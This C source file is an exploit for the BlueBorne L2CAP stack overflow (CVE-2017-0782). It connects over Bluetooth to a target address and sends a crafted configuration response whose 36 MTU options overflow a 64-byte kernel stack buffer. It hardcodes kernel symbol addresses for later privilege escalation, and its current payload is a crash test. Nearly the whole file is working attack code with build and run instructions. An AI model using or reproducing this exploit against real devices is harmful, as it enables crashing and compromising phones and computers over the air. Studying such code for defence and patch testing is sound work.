/*
 * bluborne_l2cap.c — CVE-2017-0782 L2CAP Stack Overflow Exploit (C version)
 *
 * Uses raw L2CAP signaling to send crafted CONF_RSP that overflows
 * buf[64] in the target kernel's l2cap_config_rsp() function.
 *
 * Compile on the ATTACK machine (Linux with BlueZ dev):
 *   gcc -o bluborne_l2cap bluborne_l2cap.c -lbluetooth -O2
 *
 * Run:
 *   sudo ./bluborne_l2cap 02:00:00:00:00:21
 *
 * Requires: libbluetooth-dev (apt install libbluetooth-dev)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

/* Target kernel addresses (NO KASLR) */
#define COMMIT_CREDS        0xC0054328
#define PREPARE_KERNEL_CRED 0xC00548E0
#define SELINUX_ENFORCING   0xC0B7AD18

/* L2CAP signaling */
#define L2CAP_CID_SIG   0x0001
#define L2CAP_CONF_RSP  0x05
#define L2CAP_CONF_REQ  0x04
#define L2CAP_CONN_REQ  0x02
#define L2CAP_CONN_RSP  0x03

#define L2CAP_CONF_SUCCESS  0x0000
#define L2CAP_CONF_UNACCEPT 0x0001
#define L2CAP_CONF_PENDING  0x0004

#define L2CAP_CONF_MTU  0x01
#define L2CAP_CONF_RFC  0x04
#define L2CAP_CONF_EFS  0x06

#define PSM_SDP 0x0001

/* Global state */
static bdaddr_t target_addr;
static int hci_sock = -1;
static uint16_t acl_handle = 0;
static uint8_t sig_ident = 1;

/* ============================================================
 * HCI helpers
 * ============================================================ */

static int hci_connect_acl(int dev_id, bdaddr_t *dst) {
    int dd = hci_open_dev(dev_id);
    if (dd < 0) {
        perror("hci_open_dev");
        return -1;
    }

    printf("[*] Creating ACL connection to target...\n");
    uint16_t handle;
    int ret = hci_create_connection(dd, dst, 
        htobs(HCI_DM1 | HCI_DH1 | HCI_DM3 | HCI_DH3 | HCI_DM5 | HCI_DH5),
        0, 0, &handle, 30000);
    
    if (ret < 0) {
        perror("hci_create_connection");
        hci_close_dev(dd);
        return -1;
    }

    printf("[+] ACL connected! handle=0x%04x\n", handle);
    acl_handle = handle;
    return dd;
}

/* Send raw L2CAP data over ACL */
static int send_l2cap(int dd, uint16_t handle, uint16_t cid, 
                       const uint8_t *data, int len) {
    /* ACL header: handle(2) + length(2) */
    /* L2CAP header: length(2) + CID(2) */
    int total = 4 + 4 + len;
    uint8_t *buf = malloc(total + 1);
    if (!buf) return -1;

    /* HCI ACL data packet indicator */
    buf[0] = 0x02; /* ACL data */

    /* ACL header */
    uint16_t acl_hdr = handle | (0x02 << 12); /* PB=first auto-flush, BC=point-to-point */
    buf[1] = acl_hdr & 0xFF;
    buf[2] = (acl_hdr >> 8) & 0xFF;
    uint16_t acl_len = 4 + len; /* L2CAP header + payload */
    buf[3] = acl_len & 0xFF;
    buf[4] = (acl_len >> 8) & 0xFF;

    /* L2CAP header */
    buf[5] = len & 0xFF;
    buf[6] = (len >> 8) & 0xFF;
    buf[7] = cid & 0xFF;
    buf[8] = (cid >> 8) & 0xFF;

    /* L2CAP payload */
    memcpy(buf + 9, data, len);

    /* Send via HCI socket */
    int ret = write(dd, buf + 1, total); /* skip packet indicator for write */
    free(buf);
    return ret;
}

/* Send raw L2CAP data over ACL using standard L2CAP socket */
static int send_l2cap_raw(int l2_sock, const uint8_t *data, int len) {
    return send(l2_sock, data, len, 0);
}

/* Receive L2CAP data */
static int recv_l2cap_raw(int l2_sock, uint8_t *buf, int maxlen, int timeout_ms) {
    struct timeval tv = { .tv_sec = timeout_ms / 1000, .tv_usec = (timeout_ms % 1000) * 1000 };
    setsockopt(l2_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    return recv(l2_sock, buf, maxlen, 0);
}

/* Build and send L2CAP signaling command */
static int send_l2cap_signal(int dd, uint16_t handle, uint8_t code, 
                              uint8_t ident, const uint8_t *data, int len) {
    /* Signal header: code(1) + ident(1) + length(2) */
    int sig_len = 4 + len;
    uint8_t *sig = malloc(sig_len);
    if (!sig) return -1;

    sig[0] = code;
    sig[1] = ident;
    sig[2] = len & 0xFF;
    sig[3] = (len >> 8) & 0xFF;
    memcpy(sig + 4, data, len);

    int ret = send_l2cap(dd, handle, L2CAP_CID_SIG, sig, sig_len);
    free(sig);
    return ret;
}

/* ============================================================
 * L2CAP signaling builders
 * ============================================================ */

static int send_conn_req(int dd, uint16_t handle, uint16_t psm, uint16_t scid) {
    uint8_t data[4];
    data[0] = psm & 0xFF;
    data[1] = (psm >> 8) & 0xFF;
    data[2] = scid & 0xFF;
    data[3] = (scid >> 8) & 0xFF;
    return send_l2cap_signal(dd, handle, L2CAP_CONN_REQ, sig_ident++, data, 4);
}

/* Build the overflow CONF_RSP */
static int send_overflow_conf_rsp(int dd, uint16_t handle, 
                                   uint16_t dcid, uint8_t ident) {
    /*
     * L2CAP CONF_RSP: scid(2) + flags(2) + result(2) + options(N)
     *
     * The target kernel's l2cap_config_rsp() processes our options
     * via l2cap_parse_conf_rsp(), writing into buf[64] on the stack.
     *
     * Each L2CAP_CONF_MTU option: input = type(1)+len(1)+val(2) = 4 bytes
     *                             output = same 4 bytes via l2cap_add_conf_opt
     *
     * To overflow buf[64]:
     * - First 16 MTU options fill the buffer (64 bytes)
     * - Next 12+ MTU options overflow into saved registers
     *
     * For result=UNACCEPT, input length must be ≤ 60 bytes.
     * For result=PENDING (no length check), unlimited input.
     *
     * Using PENDING path for maximum overflow control.
     */

    printf("[*] Building overflow CONF_RSP...\n");

    /* CONF_RSP header: scid(2) + flags(2) + result(2) = 6 bytes */
    int hdr_len = 6;
    
    /* Options: need enough to overflow buf[64]
     * Each MTU option = 4 bytes in, 4 bytes out
     * 16 options = 64 bytes (fills buf exactly)
     * 20 more options = 80 bytes overflow into stack frame
     * Total: 36 options × 4 bytes = 144 bytes of options
     */
    int n_fill = 16;    /* fill buf[64] */
    int n_overflow = 20; /* overflow into saved regs */
    int n_total = n_fill + n_overflow;
    int opts_len = n_total * 4;
    
    int data_len = hdr_len + opts_len;
    uint8_t *data = calloc(1, data_len);
    if (!data) return -1;

    /* Header */
    data[0] = dcid & 0xFF;         /* scid low */
    data[1] = (dcid >> 8) & 0xFF;  /* scid high */
    data[2] = 0x00;                 /* flags low (no continuation) */
    data[3] = 0x00;                 /* flags high */
    data[4] = L2CAP_CONF_PENDING & 0xFF;   /* result: PENDING */
    data[5] = (L2CAP_CONF_PENDING >> 8) & 0xFF;

    /* Fill options */
    uint8_t *p = data + hdr_len;
    
    /* Phase 1: Fill buf[64] with innocuous data */
    for (int i = 0; i < n_fill; i++) {
        *p++ = L2CAP_CONF_MTU;  /* type */
        *p++ = 2;                /* len */
        *p++ = 0x00;            /* MTU value low */
        *p++ = 0x02;            /* MTU value high (512) */
    }
    
    /* Phase 2: Overflow with target addresses
     * ARM32 saved registers on stack: typically {r4-r11, lr}
     * Each MTU option writes 4 bytes (2-byte value in l2cap_add_conf_opt)
     * BUT: l2cap_add_conf_opt writes type(1)+len(1)+val(2) = 4 bytes total
     * 
     * The value we write is in the MTU u16 field. But the type and len
     * bytes are also written. So we get: [type=0x01][len=0x02][val_lo][val_hi]
     * 
     * For more control, use RFC options (9 bytes value) or EFS (16 bytes value)
     */
    for (int i = 0; i < n_overflow; i++) {
        /* Each MTU opt writes 4 bytes: 01 02 XX XX */
        /* For initial crash test, use 0xDEAD as the value */
        *p++ = L2CAP_CONF_MTU;
        *p++ = 2;
        *p++ = 0xAD;  /* 0xDEAD little-endian */
        *p++ = 0xDE;
    }

    printf("[*] Payload: %d bytes (%d fill + %d overflow options)\n",
           data_len, n_fill, n_overflow);
    printf("[*] Sending CONF_RSP with result=PENDING...\n");

    int ret = send_l2cap_signal(dd, handle, L2CAP_CONF_RSP, ident, data, data_len);
    free(data);

    if (ret > 0) {
        printf("[+] CONF_RSP sent! (%d bytes)\n", ret);
        printf("[!] If target crashes → overflow CONFIRMED at this offset\n");
        printf("[!] If target survives → need more overflow or wrong path\n");
    } else {
        printf("[-] Send failed: %d (%s)\n", ret, strerror(errno));
    }

    return ret;
}

/* ============================================================
 * Main exploit flow
 * ============================================================ */

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: sudo %s <target_bdaddr> [hci_dev]\n", argv[0]);
        printf("  e.g.: sudo %s 02:00:00:00:00:21\n", argv[0]);
        printf("\nThis exploits CVE-2017-0782 (L2CAP stack overflow)\n");
        printf("Target WILL CRASH if the overflow reaches saved LR!\n");
        return 1;
    }

    str2ba(argv[1], &target_addr);
    int dev_id = argc > 2 ? atoi(argv[2]) : hci_get_route(NULL);

    printf("═══════════════════════════════════════════════════\n");
    printf("  CVE-2017-0782 — BlueBorne L2CAP Stack Overflow\n");
    printf("  Target: %s\n", argv[1]);
    printf("  commit_creds:        0x%08X\n", COMMIT_CREDS);
    printf("  prepare_kernel_cred: 0x%08X\n", PREPARE_KERNEL_CRED);
    printf("  NO KASLR, NO PXN, NO stack canaries\n");
    printf("═══════════════════════════════════════════════════\n\n");

    /* Step 1: Establish ACL connection */
    int dd = hci_connect_acl(dev_id, &target_addr);
    if (dd < 0) {
        printf("[-] ACL connection failed\n");
        return 1;
    }

    /* Step 2: Send L2CAP CONN_REQ for SDP */
    printf("[*] Sending L2CAP CONN_REQ (PSM=SDP, SCID=0x40)...\n");
    send_conn_req(dd, acl_handle, PSM_SDP, 0x0040);
    
    /* Step 3: Wait for CONN_RSP and CONF_REQ from target */
    printf("[*] Waiting for target L2CAP responses...\n");
    sleep(1); /* give target time to process */

    /* Step 4: Send overflow CONF_RSP */
    /* The target expects us to respond to its CONF_REQ.
     * We send CONF_RSP with result=PENDING and overflow payload.
     * The ident should match the target's CONF_REQ ident.
     * For now, use ident=1 (common default). */
    send_overflow_conf_rsp(dd, acl_handle, 0x0040, 1);

    printf("\n[*] Waiting 5 seconds for target response...\n");
    sleep(5);

    /* Check if target is still alive */
    printf("[*] Testing if target is still alive...\n");
    /* Try ping or SDP */

    /* Cleanup */
    hci_disconnect(dd, acl_handle, HCI_OE_USER_ENDED_CONNECTION, 5000);
    hci_close_dev(dd);

    printf("[*] Done.\n");
    return 0;
}
